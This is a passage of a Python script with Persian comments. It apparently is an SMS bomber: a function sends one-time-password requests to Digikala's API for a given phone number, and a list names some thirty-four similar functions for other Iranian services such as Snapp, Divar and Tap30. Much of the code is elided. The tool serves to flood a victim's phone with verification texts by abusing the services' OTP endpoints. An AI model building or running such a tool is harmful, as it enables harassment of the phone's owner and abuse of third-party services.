...
def digikala(phone):
    ...
    # URL اصلی برای ارسال کد تأیید
    url = "https://api.digikala.com/v1/user/send-otp/"
    ...
    try:
        ...
        # بررسی پاسخ‌های مختلفی که دیجیکالا ممکنه برگردونه
        if (response_data.get("status") == 200 or 
            response_data.get("success") == True or 
            response_data.get("data", {}).get("otp_sent") == True):
            print(f'{g}(Digikala) {w}Code Was Sent')
            return True
        else:
            # چاپ خطا برای دیباگ
            print(f'{r}(Digikala) Failed: {response_data}')
            return False
            
    except requests.exceptions.RequestException as e:
        print(f'{r}(Digikala) Request error: {e}')
        return False
    except json.JSONDecodeError as e:
        print(f'{r}(Digikala) JSON decode error: {e}')
        return False
...
functions = [digikala, smarket, snap, torob, tap30, okorosh, divar, gap, sheypoor, alibaba, filmnet, drdr, chmdon, itool, anar, azki, nobat, one, two, tree, fwor, five, six, seven, eyit, niyne, ten, eleven, tovelf, therty, forty, fifty, sixty, sventtubf]
